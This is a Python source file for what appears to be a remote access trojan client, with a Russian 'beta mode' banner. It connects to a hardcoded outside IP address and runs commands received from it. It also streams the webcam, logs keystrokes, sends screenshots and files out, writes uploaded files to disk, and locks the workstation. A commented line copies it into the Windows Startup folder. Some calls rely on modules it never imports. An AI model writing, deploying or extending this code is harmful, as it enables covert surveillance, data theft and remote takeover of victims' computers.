from pynput.keyboard import Listener
from sys import platform
import logging as log
import threading
import socket
import pickle
import struct
import cv2
import os

print("Это программа находится в beta режиме! Не многие вункции работают корректно!")
def StartConnect(ip,port):
	try:
		s.connect((ip,port))
		s.send(platform.encode())
		while True:
			try:
				data = s.recv(2048).decode()
				print(data)
				StartFunction(data)
			except:
				break
	except:
		return

def StartCommand(com):
		output = os.popen(com).read()
		return output

def OpenCamera():
	cap=cv2.VideoCapture(0)
	while True:
		ret,frame=cap.read()
		data = pickle.dumps(frame)
		message_size = struct.pack("L", len(data))
		s.sendall(message_size + data)
		print('okey')
def OpenKeyboard():
	print(s)
	log.basicConfig(level = log.DEBUG,)
	def onPressed(key):
		keys = log.info(str(key))
		print(key)
		s.send(key.encode())
	with Listener(on_press = onPressed) as listeners:
		listeners.join()

def StartFunction(data):
	if data == "func: say:":
		fg = s.recv(2048).decode()
		engine.say(fg)
		engine.runAndWait()
	elif data == 'vd':
		cd = s.recv(2048).decode()
		os.chdir(cd)
	elif data == 'func: play_music:':
		hg = s.recv(2048).decode()
		playsound(hg)
	elif data == 'func: error:':
		try:
			error1 = s.recv(2048).decode()
			error2 = s.recv(2048).decode()
			messagebox.showerror(error1,error2)
		except:
			return
	elif data == 'func: open:':
		opens = s.recv(2048).decode()
		f = open(opens,'rb')
		gf = f.read()
		f.close()
		s.send(gf.encode())
	elif data == 'func: winlocker':
		os.popen('rundll32.exe user32.dll, LockWorkStation')
	elif data == 'func: setpos':
		pyautogui.click(0, 0)
		print(" ")
	elif data == 'func: cam':
		threading.Thread(target=OpenCamera).start()
	elif data == 'func: screenshot':
		print(" ")
		pyautogui.screenshot('screenshot.png')
		file = open('screenshot.png', 'rb')
		image_data = file.read(2048)
		while image_data:
			s.send(image_data)
			image_data = file.read(2048)
		file.close()
		os.remove('screenshot.png')
	elif data == 'func: save:':
		file = open(s.recv(2048), 'rb')
		image_data = file.read(2048)
		while image_data:
			s.send(image_data)
			image_data = file.read(2048)
		file.close()
	elif data == 'func: paste:':
		df = s.recv(2048).decode()
		print(df)
		file = open(df, "wb")
		image_chunk = s.recv(2048)
		while image_chunk:
			file.write(image_chunk)
			image_chunk = s.recv(2048)
		file.close()
	elif data == 'sh_fake':
		os.popen("shutdown -s -t " + 5)
		os.popen("shutdown -a")
	elif data == "func: open_site:":
		hg = s.recv(2048)
		hg = hg.decode()
		webbrowser.open_new(hg)
	elif data == "func: keyslogger":
		threading.Thread(target=OpenKeyboard).start()
	elif data[-1] == "'s":
		while True:
			os.popen(data[:-1])
	else:
		output = StartCommand(str(data))
		if len(output) == 0:
			s.send(" ".encode())
		else:
			s.send(output.encode())

if __name__ == '__main__':
	'''os.popen('copy "client.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"')'''
	s = socket.socket()
	while True:
		StartConnect("37.147.142.138",6201)
